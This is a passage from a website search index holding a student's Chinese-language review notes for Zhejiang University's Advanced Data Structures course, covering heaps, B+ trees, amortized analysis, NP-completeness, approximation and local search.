m\u7684\u6811\uff0croot\u6700\u591a\u6709m\u4e2a\u5b50\u6811</li> <li>\u200b\u200b</li> <li>\u5bf9\u4e8eB+ tree\u7684\u5b9a\u4e49\u95ee\u9898</li> </ul> </li> <li> <p>M\u9636b+\u6811\uff0cB+ tree of order M = 2-3-4-...-M tree\uff08\u5b9e\u9645\u5e94\u8be5\u4eceM/2\u7684\u4e0a\u754c\u5f00\u59cb\uff09</p> </li> <li>\u5982\u679c\u4e0d\u662f\u53ea\u6709\u4e00\u4e2a\u6839\u8282\u70b9\u7684\u60c5\u51b5\u4e0b\uff0c \u6839\u8282\u70b9\u6709\\(2-M\\)\u4e2achildren\uff0c\u53cd\u4e4b\uff0c\u6839\u8282\u70b9\u548c\u53f6\u5b50\u91c7\u53d6\u4e00\u5957\u89c4\u5219</li> <li>\u975e\u6839\u975e\u53f6\u5b50\u8282\u70b9\u6709 \\(\\left \\lceil M/2\\right \\rceil - M\\) \u4e2achildren</li> <li>\u53f6\u5b50\u8282\u70b9\u6709\\(\\left \\lceil M/2\\right \\rceil - M\\)\u4e2a\u5143\u7d20</li> <li>keys\u4ec5\u4ec5\u6307\u53f6\u5b50\u8282\u70b9\u7684\u5143\u7d20</li> <li> <p>\u5220\u9664\u8fc7\u5c11\u548c\u63d2\u5165\u8fc7\u591a\u7684\u5177\u4f53\u89e3\u51b3\u65b9\u6848</p> <ul> <li>\u63d2\u5165\u7684\u5143\u7d20\u8fc7\u591a\u7684\u60c5\u51b5\u4e0b\uff0c\u8981\u628a\u5143\u7d20\u79fb\u4ea4\u7ed9\u4e0a\u4e00\u5c42\uff0c\u53f6\u5b50\u8282\u70b9\u81ea\u8eab\u8fd8\u4fdd\u7559\u8fd9\u4e2a\u5143\u7d20\uff0c\u975e\u53f6\u5b50\u8282\u70b9\u81ea\u8eab\u4e0d\u4fdd\u7559\u8fd9\u4e2a\u5143\u7d20</li> <li>\u7ea2\u9ed1\u6811\u7684\u63d2\u5165</li> <li>\u7ea2\u9ed1\u6811\u7684\u5220\u9664</li> </ul> </li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#_3","title":"\u5012\u6392\u7d22\u5f15","text":"<ul> <li>Inverted file contains a list of pointers to all occurrences of a term in the text.   T</li> <li> <p>\u6982\u5ff5\u8fa8\u6790</p> </li> <li> <p>word stemming  \u5355\u8bcd\u53d8\u539f\u578b</p> </li> <li>stop words \u5e38\u89c1\u8bcd</li> <li></li> <li> <p>term-partitioned index    \u5728\u4e00\u53f0\u673a\u5668\u4e0a\u53ea\u5efa\u7acb\u90e8\u5206\u7684\u8bcd\u7684\u6240\u6709\u7d22\u5f15</p> </li> <li>document-partitioned index  \u5728\u4e00\u53f0\u673a\u5668\u4e0a\u53ea\u5efa\u7acb\u6240\u6709\u7684\u8bcd\u5bf9\u4e8e\u90e8\u5206\u6587\u672c\u7684\u7d22\u5f15</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>precision \u641c\u51fa\u6765\u7684\u4e1c\u897f\u91cc\u9762\u767e\u5206\u4e4b\u591a\u5c11\u662f\u9700\u8981\u7684   Precision measures the quality of all the retrieved documents.</li> <li>recall \u60f3\u8981\u7684\u6b63\u786e\u7b54\u6848\u6709\u591a\u5c11\u88ab\u641c\u7d22\u51fa\u6765\u4e86  \u4e0a\u8ff0\u8fd9\u4e24\u4e2a\u5143\u7d20\u90fd\u662f\u53ef\u4ee5\u8ba1\u7b97\u7684</li> <li>\u200b\u200b</li> <li>Term dictionary \u548c post list</li> <li> <ul> <li>\u200b\u200b</li> <li>posting list\u8d8a\u77ed\u7684\u8bcd\u8d8a\u91cd\u8981</li> <li>thresholding</li> </ul> </li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#_4","title":"\u5de6\u503e\u5806\u548c\u659c\u5806","text":"<ul> <li>\u5de6\u503e\u5806\u9700\u8981\u7ef4\u62a4NPL\uff0c\u5de6\u5b69\u5b50NPL\u4e00\u76f4\u5927\u4e8e\u7b49\u4e8e\u53f3\u5b69\u5b50</li> <li> <p>\u5de6\u503e\u5806 leftist heap</p> </li> <li> <p>\u4ee5\u961f\u5217\u7684\u65b9\u5f0fbuild heap\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(N)</p> </li> <li>\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\uff1a Merge, insert deleteMin \u90fd\u662f\\(O(logN)\\)</li> <li>\u7279\u6b8a\u5c5e\u6027\uff1a NPL\uff0c\u5f53\u5de6\u53f3\u5b69\u5b50\u6709\u4e00\u4e2a\u4e3a\u7a7a\u65f6\uff0cNPL\u4e3a1\uff0c\u5426\u5219\u5176\u4e3a\\(min\\{npl(left\\_child),npl(right\\_child)\\}+1\\)\u200b  NPL\u548c\u5185\u90e8\u8282\u70b9\u6570\u91cf\u7684\u5173\u7cfb \\(N\\geq 2 ^{r+1} -1\\) \u5176\u4e2dr\u662fNPL</li> <li>\u7279\u6b8a\u8981\u6c42\uff1a \u5de6\u5b69\u5b50\u7684NPL\u5927\u4e8e\u7b49\u4e8e\u53f3\u5b69\u5b50</li> <li> <p>\u5177\u4f53\u64cd\u4f5c\uff1a</p> <ul> <li>Merge\uff1a\u5408\u5e76\u4e24\u4e2a\u6811\uff0c\u9009\u62e9\u6839\u8282\u70b9\u66f4\u5c0f\u7684\u90a3\u4e2a\uff0c\u5c06\u5176\u53f3\u5b50\u6811\u548c\u53e6\u4e00\u9897\u6811\u7ed3\u5408\uff08\u6b64\u5904\u7ed3\u5408\u53d1\u751f\u9012\u5f52\uff09\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6211\u4eec\u540c\u65f6\u9700\u8981\u901a\u8fc7\u4ea4\u6362\u5de6\u53f3\u5b50\u6811\u6765\u7ef4\u62a4\u6027\u8d28</li> <li>insert\uff1a\u5408\u5e76\u7684\u7279\u6b8a\u60c5\u51b5</li> <li>deleteMin\uff1a\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u5408\u5e76</li> <li>\u7279\u5b9a\u70b9\u5220\u9664*</li> <li>\u5177\u4f53\u4ee3\u7801\u770b\u4e00\u904d*</li> <li>\u200b\u200b</li> <li>\u659c\u5806 skew heap</li> </ul> </li> <li> <p>\u64cd\u4f5c\u590d\u6742\u5ea6\uff1a Merge, insert, deleteMin \u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u662f\\(O(N)\\) \u4f46\u662f\u644a\u8fd8\u65f6\u95f4\u590d\u6742\u5ea6\u90fd\u662f\\(O(logN)\\)</p> </li> <li>\u7279\u6b8a\u5c5e\u6027\uff1a \u5b58\u5728\u4e00\u79cd light node*</li> <li>The number of light nodes along the right path of a skew heap is O(logN).</li> <li> <p>\u5177\u4f53\u64cd\u4f5c\uff1a</p> <ul> <li>Merge\uff1a\u6bcf\u4e00\u6b21\u90fd\u627e\u5230\u4e24\u9897\u6811\u4e2d\u5c0froot\u7684\u90a3\u4e2a\uff0c\u4ea4\u6362\u5176\u5de6\u53f3\u5b50\u6811\uff0c\u4ea4\u6362\u4e4b\u540e\u5c06\u5176\u5de6\u5b50\u6811\u548c\u53e6\u4e00\u9897\u6811\u8fdb\u884cmerge\uff0c\u5f62\u6210\u9012\u5f52\uff0c\u9012\u5f52\u5230\u5e95\uff0c\u5982\u679c\u662f\u7a7a\u6811\u548c\u4e00\u4e2a\u6811\u5408\u5e76\uff0c\u90a3\u5c31\u76f4\u63a5\u63a5\u8fc7\u6765\u3002\u4e0e\u7a7a\u6811\u5408\u5e76</li> <li>insert\uff1a\u7279\u6b8a\u5408\u5e76</li> <li>deleteMin\uff1a\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u5408\u5e76</li> <li>\u644a\u8fd8\u5206\u6790*</li> <li>\u5177\u4f53\u4ee3\u7801\u770b\u4e00\u904d*</li> <li>\u4e8c\u53c9\u5806\u7684\u65f6\u95f4\u590d\u6742\u5ea6</li> </ul> </li> <li> <p>Merge\u662f\\(O(N)\\)\uff0cinsert\u548cdeleteMin\u90fd\u662f\\(O(logN)\\)</p> </li> <li>\u5176right path\u4e3ar nodes\u7684\u60c5\u51b5\u4e0b\uff0cleftist tree\u81f3\u5c11\u67092<sup>r</sup> - 1\u4e2anodes</li> <li>\u200b\u200b</li> <li>quiz4 1-3 \u659c\u5806\u7684\u644a\u8fd8\u5206\u6790 2-2</li> <li>hw4  1-1 \u7ed3\u8bba   \u200b\u200b</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#binomial-queue","title":"Binomial Queue","text":"<ul> <li> <p>\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\uff1a Merge, FindMin, insert, deleteMin \u90fd\u662f\\(O(logN)\\) \u5982\u679c\u7ef4\u62a4\u4e00\u4e2a\u989d\u5916\u7684\u6307\u9488\uff0cFindMin\u662f\\(O(1)\\)\uff0c\u63d2\u5165\u6700\u574f\u60c5\u51b5\u662f\\(O(logN)\\) \u5e73\u5747\u4e0b\u6765\u662f\\(O(1)\\)\uff0c\u5e76\u4e14\u7a7a\u961f\u5217\u63d2\u5165N\u4e2a\u7684\u590d\u6742\u5ea6\u4e3a\\(O(N)\\)</p> </li> <li>\u7279\u6b8a\u5c5e\u6027\uff1a \u591a\u53c9\u6811\uff0c\u4e14\u6709\u591a\u4e2a\uff0c\u6309\u7167size\u964d\u5e8f\u6392\u5217\uff0c\u5c31\u50cf\u4e8c\u8fdb\u5236\u6570\u4e00\u6837 1101 \u6700\u5de6\u8fb9\u7684\u662f\u6700\u9ad8\u4f4d</li> <li>\u5177\u4f53\u7ed3\u6784\uff1a \u6709sibling link\u548cleft child link\u6784\u5efa\u7684\u591a\u53c9\u6811</li> <li> <p>\u5177\u4f53\u64cd\u4f5c\uff1a</p> <ul> <li>Merge\uff1a\u4ece\u6700\u5c0f\u7684size\u5f00\u59cb\u5408\u5e76\uff0c\u5982\u679c\u65e2\u6709\u8fdb\u4f4d\u53c8\u6709\u6ea2\u51fa\uff0c\u90a3\u4f4d\u4fdd\u7559\u8fdb\u4f4d\u7684\u90a3\u4e2a</li> <li>insert\uff1a\u5408\u5e76\u7684\u7279\u6b8a\u60c5\u51b5</li> <li>deleteMin\uff1a\u62c6\u5206\u51fa\u4e24\u7ec4\u6811\u8fdb\u884c\u5408\u5e76</li> <li>\u7279\u5b9a\u70b9\u5220\u9664*</li> <li>\u5177\u4f53\u4ee3\u7801\u770b\u4e00\u904d*  \u200b\u200b</li> <li>\u644a\u8fd8\u5206\u6790</li> <li>hw5 \u6ce8\u610f\u533a\u5206binomial trees\u548cbinomial queue\uff0c\u5176\u4e2d\\(B_0\\)\u662f\u63071\u4e2a\u5143\u7d20\u7684binomial tree</li> <li>quiz5 1-5 insert\u6709\u65f6\u4e0d\u4e0esize\u5927\u5c0f\u6709\u5173\uff0c\u548c\u4f1a\u53d1\u751f\u7684\u8fdb\u4f4d\u6570\u91cf\u6709\u5173   \u200b\u200b</li> </ul> </li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#backtracing","title":"backtracing","text":"<ul> <li>\u56de\u6eaf\u95ee\u9898\u7684\u590d\u6742\u5ea6\u96be\u4ee5\u5206\u6790</li> <li>\u7a77\u4e3e\u5e76\u4e0d\u662f\u5728\u6709\u9650\u65f6\u95f4\u5185\u90fd\u80fd\u89e3\u51b3\u6240\u6709\u95ee\u9898</li> <li> <p>\u516b\u7687\u540e\u95ee\u9898</p> </li> <li> <p>\u5b9e\u9645\u89e3\u4f5c\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u4ee5\u56db\u7687\u540e\u95ee\u9898\u4e3a\u4f8b \\((2,4,1,3)\\)\uff0c\u8868\u793a\u7b2c\u4e00\u5217\u7b2c\u4e8c\u6392\u6709\u68cb\u5b50\uff0c\u7b2c\u4e8c\u5217\u7b2c\u56db\u6392\u6709\u68cb\u5b50\u3002\u3002\u3002</p> </li> <li>\u6700\u77ed\u8f66\u7ad9\u95ee\u9898</li> <li>\u200b\u200b</li> <li> <p>\\(\\alpha-\\beta\\) \u526a\u679d  tic-tac-toe game</p> </li> <li> <p>tic-tac-toe game \uff1f\uff1f\uff1f*</p> <ul> <li>goodness function \\(f(P) = W_{AI} - W_{human}\\) W\u53ea\u9700\u8981\u8ba1\u7b97\u5f53\u524d\u72b6\u6001\u4e0b\u8d62\u5f97\u53ef\u80fd\u6027</li> <li>min level\u9012\u51cf\u6216\u8005max level\u9012\u589e\u7684\u65f6\u5019\uff0c\u5c31\u53ef\u4ee5\u526a\u679d\u4e86\uff0c\u4e24\u4e2a\u8282\u70b9\u9009max\u8fd8\u662fmin\u6839\u636e\u4e0a\u4e00\u5c42\u7684\u5c5e\u6027\u6765\u5224\u65ad</li> <li>\\(\\alpha\\  prun\\) \u53d1\u751f\u5728min\u5c42\u9012\u51cf\uff0c\u5e76\u4e14\u5144\u5f1f\u6bd4\u5176\u66f4\u5c0f\u7684\u65f6\u5019\uff0c\u4f8b\u5982\u8fd9\u9053\u9898\uff0c\u5f53\\(x\\geq9\\) \u7684\u65f6\u5019\uff0c\u53d1\u751f\u526a\u679d \u200b\u200b</li> <li>\\(\\beta\\  prun\\)\u53d1\u751f\u5728max\u5c42\u9012\u589e\uff0c\u4e14\u5144\u5f1f\u6bd4\u8d77\u66f4\u5927\u7684\u65f6\u5019\uff0c\u4f8b\u5982\u8fd9\u9053\u9898\uff0c\u5f53\\(a&gt; 68\\)\u7684\u65f6\u5019\uff0cmax\u5c42\u9012\u589e\uff0c\u5e76\u4e14\u9700\u8981\\(a &gt; b\\) \u200b\u200b</li> <li>\\(\\alpha-\\beta\\) \u526a\u679d\u7684\u987a\u5e8f\u8fd8\u662f\u6309\u7167\u8fd9\u68f5\u6811\u7684\u524d\u5e8f\u904d\u5386\u987a\u5e8f\u6765\uff0c\u5c31\u548c\u6b63\u5e38\u7684\u7a77\u4e3e\u6811\u90a3\u6837</li> </ul> </li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#conquer","title":"Conquer","text":"<p>\u4e3b\u8981\u5c31\u662f\u80cc\u90a3\u4e09\u4e2a\u65b9\u7a0b</p> <ul> <li> <p>\u591a\u8def\u5f52\u5e76\u6392\u5e8f\uff0c\u53ea\u8981\u8fd9\u4e2a\u8def\u8fd8\u662f\u4e2a\u5e38\u6570\uff0c\u5c31\u662f\\(O(nlogn)\\)</p> </li> <li> <p>\u200b\u200b</p> </li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#dp","title":"DP","text":""},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#_5","title":"\u603b\u7ed3","text":"<ul> <li>\u6709\u4ee3\u7801\u90fd\u9700\u8981\u770b\u4e00\u904d</li> <li>\u644a\u8fd8\u5206\u6790</li> <li>\u5206\u6cbb\u7684\u590d\u6742\u5ea6\u5206\u6790\u516c\u5f0f</li> <li>splay\u6811\u8fd8\u9700\u8981\u770b\u4e00\u770b\uff0c\u5177\u4f53\u7684\u65cb\u8f6c</li> <li>B+ \u6811\u7684key\u4ec5\u4ec5\u5bf9\u4e8e\u53f6\u5b50\u8282\u70b9</li> <li>tic-tac game  \u6700\u7ec8\u80dc\u5229\u7684\u53ef\u80fd\u6027\u6570\u91cf\uff0c\u4e5f\u5373\u753b\u51fa\u4e00\u6761\u7ebf\uff0c\u7ebf\u4e0a\u53ea\u9700\u8981\u6ca1\u6709\u5bf9\u65b9\u7684\u68cb\u5b50\u5373\u53ef\uff0c\u4e00\u822c\u662f\u2018X \u2019-\u2018O\u2019   \u200b\u200b</li> <li>\u65cb\u8f6c</li> <li>\u7a7a\u6811\u7684height\u662f-1</li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E4%B8%AD%E5%A4%8D%E4%B9%A0/#_6","title":"\u644a\u8fd8\u5206\u6790","text":"<p>\u644a\u8fd8\u5206\u6790\u7684\u91cd\u5fc3\u5728\u4e8e\u52bf\u80fd\u6cd5</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u64cd\u4f5c\\(P\\)\uff0c\u5176\u7b2c\\(i\\)\u6b65\u7684\u6d88\u8017\u8bb0\u4e3a\\(a(i)\\)\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2an\u6b65\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u7684\u6d88\u8017\u662f\\(\\sum_1^na(i)\\)</p> <p>\u6211\u4eec\u6709\u4e00\u4e2a\u52bf\u80fd\u51fd\u6570\\(\\phi(S_i)\\) \\(S_i\\) \u8868\u793a\u7b2ci\u6b65\u4e4b\u540e\u6211\u4eec\u5bf9\u4e8e\u6574\u4e2a\u5c40\u9762\u7684\u72b6\u6001\u7684\u63cf\u8ff0</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u6bcf\u4e00\u6b65\u7684\u4ee3\u4ef7\uff0c\u5176\u5b9e\u662f\u7531\u4e24\u90e8\u5206\u7ec4\u6210</p> <ul> <li>\u4e00\u90e8\u5206\u662f\u5176\u672c\u8eab\u64cd\u4f5c\u7684\u4ee3\u4ef7</li> <li>\u4e00\u90e8\u5206\u662f\u5bfc\u81f4\u7cfb\u7edf\u7684\u72b6\u6001\u53d8\u9ad8\u7684\u4ee3\u4ef7</li> </ul> <p>\u6211\u4eec\u60f3\u8c61\u4e00\u4e0b\u4e4b\u524d\u90a3\u4e2a\u6808\u7684\u4f8b\u5b50\uff0c\u4e00\u4e2a\u666e\u901a\u7684push\u64cd\u4f5c\u81ea\u8eab\u4ee3\u4ef7\u5f88\u5c0f\uff0c\u4f46\u662f\u5176\u4e3a\u672a\u6765\u7684\u5927\u89c4\u6a21pop\u57cb\u4e0b\u4e86\u9690\u60a3\uff1b\u800c\u672a\u6765\u7684\u5927\u89c4\u6a21pop\u867d\u7136\u81ea\u8eab\u64cd\u4f5c\u4ee3\u4ef7\u5f88\u9ad8\uff0c\u4f46\u662f\u5176\u5927\u5927\u964d\u4f4e\u7cfb\u7edf\u81ea\u8eab\u7684\u72b6\u6001\u3002\u53ea\u8981\u80fd\u627e\u5230\u4e00\u4e2a\u63cf\u8ff0\u8fd9\u4e2a\u72b6\u6001\u7684\u51fd\u6570\uff0c\u4f7f\u5f97\u4e8c\u8005\u76f8\u52a0\u7ed3\u679c\u4e3a\u6211\u4eec\u76ee\u6807\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5373\u53ef\u3002</p> <p>\u4f46\u662f\u4e0a\u8ff0\u7684\u4f8b\u5b50\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u6211\u4eec\u601d\u8003\u4e00\u4e0bsplay\u6811\uff0c\u5bf9\u4e8e\u8fd9\u6837\u8f83\u4e3a\u590d\u6742\u7684\u7ed3\u6784\uff0c\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u6bd4\u8f83\u5408\u9002\u7684\u63cf\u8ff0\u5176\u72b6\u6001\u7684\u51fd\u6570</p> \\[ \\phi(T)=\\sum_{des\\in T}log\\ Size(des) \\] <p>\u4e0a\u8ff0\u5f0f\u5b50\u6709\u70b9\u96be\u61c2\uff0c\u4f46\u662f\u5176\u5b9e\u5c31\u662f\u6307\uff0c\u6240\u6709\u4ee5T\u7684\u540e\u4ee3\u4e3a\u6839\u7684\u5b69\u5b50\u6811\u7684\u5927\u5c0f\uff0c\u53d6\u5bf9\u6570\uff0c\u518d\u6c42\u548c</p> <p>\u200b\u200b</p> <p>\u805a\u5408\u5206\u6790 aggregate analysis</p> <p>accounting method</p> <p>potential method</p> <p>\u200b\u200b</p> <ul> <li>\u662f\u8def\u5f84\u4e0a\u7684node\u4e0d\u662fmost nodes</li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"\u671f\u672b\u590d\u4e60","text":"<ul> <li>\u51e0\u79cd\u7279\u522b\u7684\u4e8c\u53c9\u6811\u7684\u5b9a\u4e49</li> <li>NP \u4e2d\u7684formal language \u548c VC\u95ee\u9898</li> <li>Approximation \u4e2d\u7684 k-center \u95ee\u9898</li> <li>HW 11 \u98982-3</li> <li>HW 12 \u90fd\u4e0d\u592a\u4f1a</li> <li>Random \u91cc\u9762\u7684 quick Sort\uff0c\u597d\u5427\u90fd\u4e0d\u592a\u4f1a</li> <li>quick sort \u662f \u5206\u6cbb</li> <li>random sampling</li> <li>\u6700\u5927\u5272\u95ee\u9898</li> <li>\u7f16\u7a0b\u9898 + \u586b\u7a7a\u9898</li> <li>\u5c0f\u89d2\u9f99\u548cwwj\u7684Ads\u7b14\u8bb0</li> <li>\u80cc\u8bf5\u5206\u6cbb\u516c\u5f0f</li> <li>skip list? \u968f\u673a\u7b97\u6cd5\uff0c\u590d\u6742\u5ea6logn\uff0c\u6700\u574f\u590d\u6742\u5ea6\u4e3an</li> <li>\u5e76\u884c\u7684merge</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_2","title":"\u9700\u8981\u8bb0\u5fc6\u7684","text":"<ul> <li>AVL \u6811\u6811\u9ad8\u548c\u6700\u5c0f\u8282\u70b9\u6570\u7684\u5bf9\u5e94\u5173\u7cfb</li> <li>BP \u6811\u7684\u5b9a\u4e49</li> <li>\u644a\u8fd8\u7684\u4e09\u79cd\u65b9\u5f0f</li> <li>4 queen\u7684\u95ee\u9898\u6709\u4e24\u4e2a\u89e3\u51b3</li> <li>\u4e24\u4e2a\u6811/\u5806\u7684\u644a\u8fd8\u5206\u6790\uff0c\u52bf\u80fd\u51fd\u6570\uff0cself-adjusting data structure</li> <li>\u200b\u200b</li> <li>\u200d</li> <li>next fit, first fit, best fit, online\uff0coffline \u7684\u8fd1\u4f3c\u7387 2 1.7 1.7 5/3 11/9</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>```language   What makes the time complexity analysis of a backtracking algorithm very difficult is that the number of solutions that do satisfy the restriction is hard to estimate.\uff08True\uff09</li> </ul> <p>What makes the time complexity analysis of a backtracking algorithm very difficult is that the sizes of solution spaces may vary.\uff08False\uff09   ```</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_3","title":"\u5386\u5e74\u5377\u9519\u9898","text":"<p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u7528\u5206\u6cbb\u7684\u9012\u63a8\u5f0f\uff0c\u6bcf\u4e2a\u4ee3\u5165\u4e00\u4e0b\u5c31\u884c</p> <p>\u200b\u200b</p> <p>\u5df2\u89e3\u51b3\uff0c\u753b\u56fe</p> <p>\u200b\u200b</p> <p>\u6211\u731c\u662f2</p> <p>\u200b\u200b</p> <p>\u6bcf\u4e2acandidate\u80fd\u5927\u4e8e\u524dk\u4e2a\u7684\u6982\u7387\u90fd\u662f 1 / (k+1)</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200d</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u7b54\u6848\u662fD</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#greedy","title":"Greedy","text":"<ul> <li>quiz 10</li> <li>HW 9</li> <li> <p>huffman code</p> </li> <li> <p>huffman code \u4e0d\u4e00\u5b9a\u4f1a\u6bd4\u6b63\u5e38\u7f16\u7801\u8282\u7701\u65f6\u95f4\uff0c\u6709\u53ef\u80fd\u751f\u6210\u7684\u6811\u5c31\u662f\u5b8c\u5168\u4e8c\u53c9\u6811</p> </li> <li>\u505a\u6cd5\uff1a\u7ef4\u62a4\u4f7f\u7528\u9891\u7387\u7684 min heap \u6bcf\u6b21\u53d6\u51fa\u6700\u5c0f\u7684\u4e24\u4e2a\uff0c\u7b2c\u4e00\u4e2a\u653e\u5de6\u8fb9\uff0c\u7b2c\u4e8c\u4e2a\u653e\u53f3\u8fb9\uff1b\u5de6\u7f16\u78010\uff0c\u53f3\u7f16\u78011</li> <li>\u7279\u6027\uff1a\u5bf9\u4e8eN\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u8868\uff0c\u5176\u524d\u7f00\u548c\u6700\u5927\u503c\u4e0d\u4f1a\u8d85\u8fc7N-1</li> <li>\u7279\u6027\uff1a\u5bf9\u4e8en\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u8868\uff0c\u5b83\u7684huffman tree\u7684node\u6570\u91cf\u4e3a2 * n - 1</li> <li>activity select problem</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u5173\u4e8e\u8fd9\u9053\u9898\u7684\u7b2c\u4e09\u95ee\u53ef\u4ee5\u4e3e\u4e00\u4e2a\u53cd\u4f8b \u6709 7 5 1 \u4e09\u79cd\u9762\u989d\uff0c\u603b\u9700\u8981\u5151\u636217\u5757\u94b1\uff0c\u7528greedy 7 7 1 1 1, \u6700\u4f18 7 5 5</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#np","title":"NP","text":"<ul> <li>Quiz 11</li> <li> <p>HW 10</p> </li> <li> <p>P -&gt; NP(NPC) -&gt; NP-hard -&gt; undecidable problem(\u4f8b\u5982\u505c\u673a\u95ee\u9898)</p> </li> <li>NPC \u540c\u65f6\u662fNP\u4e5f\u662fNP-hard</li> <li>NP hard\u662f\u6307\u53ef\u4ee5\u88ab\u6240\u6709NP\u95ee\u9898\u591a\u9879\u5f0f\u89c4\u7ea6\u7684\u95ee\u9898</li> <li>NP \u95ee\u9898 \u662f\u975e\u786e\u5b9a\u56fe\u7075\u673a\u591a\u9879\u5f0f\u89e3\u51b3\u7684\u95ee\u9898\uff1b\u4e5f\u662f\u786e\u5b9a\u56fe\u7075\u673a\uff0c\u591a\u9879\u5f0f\u65f6\u95f4\u9a8c\u8bc1\u7684\u95ee\u9898</li> <li>\u200b\u200b</li> <li>P = NP \u7684\u4e00\u79cd\u8bc1\u660e\u65b9\u5f0f\u662f\u8bc1\u660e\u4e00\u4e2aP\u95ee\u9898\u662fNPC\uff0c\u4f8b\u5982Shortest-Path</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u4e0a\u9898\u5305\u62ec\u4e86\u4e00\u4e9b\u5e38\u89c1\u7684NPC\u95ee\u9898</li> <li>\u200d</li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#approximation","title":"Approximation","text":"<ul> <li>Quiz 12</li> <li>HW 11 \u98982-3</li> <li> <p>\u4e00\u4e9b\u6982\u5ff5</p> </li> <li> <p>An algorithm is called an \u03b1(n)-approximation algorithm if it achieves an approximation ratio of \u03b1(n)</p> </li> <li>\\(\\alpha = 1 + \\varepsilon\\) , \u6240\u8c13\\(\\varepsilon\\)\u662f\u8fd1\u4f3c\u8303\u5f0f\u7684\u4e00\u4e2a\u53c2\u6570</li> <li>\u5173\u4e8e\u8fd1\u4f3c\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u8868\u793a\u8981\u540c\u65f6\u8003\u8651 n \u548c \\(\\varepsilon\\)</li> <li>polynomial-time approximation scheme. \u5173\u4e8en\u662f\u591a\u9879\u5f0f</li> <li>fully polynomial-time approximation scheme. \u5173\u4e8en\u548c\\(1/\\varepsilon\\)\u90fd\u662f\u591a\u9879\u5f0f</li> <li> <p>bin packing problem</p> </li> <li> <p>next fit</p> </li> <li>first fit \u4f7f\u7528first fit\u7684\u60c5\u51b5\uff0c\u5982\u679c\u51cf\u5c11\u4e00\u4e2aitem\uff0c\u6709\u53ef\u80fd\u53cd\u800c\u53d8\u591a</li> <li>best fit</li> <li>on-line</li> <li>off-line</li> <li>\u200b\u200b</li> <li>01 backpacking</li> <li>k-center</li> <li>Approximation algorithm is for finding the near-optimal solutions in polynomial time. \u8fd9\u53e5\u8bdd\u662f\u5bf9\u7684</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u8fd1\u4f3c\u6bd4\u4ec5\u4ec5\u662f\u5bf9\u4e8e\u4e00\u4e2a\u7b97\u6cd5\u800c\u8a00</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> </ul>"},{"location":"ZJU-course/ADS/ZJU-course/ADS/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#local-search","title":"local Search","text":"<ul> <li>Quiz 13</li> <li>HW 12</li> <li> <p>vertex cover</p> </li> <li> <p>\u200b\u200b</p> </li> <li>original gradiant descent method.</li> <li>Metropolis Algorithm \u91c7\u7528\u4e86\u6a21\u62df\u9000\u706bannealing 